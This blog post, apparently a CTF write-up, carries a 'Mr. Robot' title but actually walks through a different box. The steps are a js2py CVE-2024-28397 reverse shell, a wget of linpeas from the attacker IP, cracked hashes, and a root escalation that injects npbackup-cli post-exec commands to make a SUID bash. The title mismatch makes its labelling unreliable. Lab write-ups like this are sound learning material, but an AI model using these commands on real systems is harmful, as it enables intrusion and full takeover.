---
layout: post
title: Mr.Robot
date:   2025-11-10 11:05
description: TryHackMe Mr. Robot CTF Write-Up
tags: tryhackme wordpress 
comments: false
---
# Mr. Robot
-TRYHACKME CTF WRITEUP-
[Link To CTF](https://tryhackme.com/room/mrrobot)


--CODE PART TWO--


ran namp 

22 and 8000 open 
8000 shows http-alt
opened webpage at port 8000
dirb shows /download /dashboard /login /logout /register
web app shows we can download source code, register user or login

Tried failed:
-found login page 
-registered user - test/test
--tested uploading code in web app : test user with javascript xxs code 


Tried worked:
After downloading and uzipping the source code
-looking in source code file we see: 
/app/instance/users.db
users.db showing nothing


requirements.txt

flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74

looking fo js2py exploits i found this:
https://github.com/naclapor/CVE-2024-28397

running code and starting a listener we get shell onto target

python3 codetwo.py --target http://10.10.11.82:8000/run_code --lhost 10.10.15.194 --lport 4444


logging in we see the user "marco"


putting this into hydra failed
wget http://10.10.15.194/evil-files/linpeas/linpeas.sh
noshowed:
backup file
/home/app/app/instance/users.db:



users.db now shows:

'M123202cb962ac59075b964b07152d234b70'Mappa97588c0e2fa3a024876339e27aeb42e)Mmarco649c9d65a206a75f5abe509fe128bce5

we get marco password:
649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove


cracking the hash: https://hashes.com/en/decrypt/hash

We can now switch users to marco
This is also useful for future ssh logins
we can get user flag now

0fda17caa8c5ab35b61147f81d871262



PRIV ESC

in order to allow nano run:
export TERM=xterm
nano filename.txt

 
sudo -l shows
Marco can run npbackup-cli as a superuser.
npbackup-cli is a backup tool

Runnig this file we can see that it wont run without the config file
Looking in marco home directory we can see the config file 

Looking here was can add post execution commands
Lets add a post command to be run as root

We will modigy the post execution commands
post_exec_commands: [cp /bin/bash /tmp/hacked; /bin/chmod +s /tmp/hacked]

This created a script named hacked with /bin/bash in the tmp directory and added the suid bit

After modifying this, I used the command:
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b

This started the backup
Stop the backup using Ctrl + C.
We show errors, 
Lets run as sudo again
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b/

The snapshot was saved. 
And we get success

Now, to get the root lets run our script, 
to run /bin/bash script as root type we add -p to keep the original permissions
since we created the file as root, it should run as root

/tmp/hacked -p 
We are root!
We now get the root flag and pwn the machine 



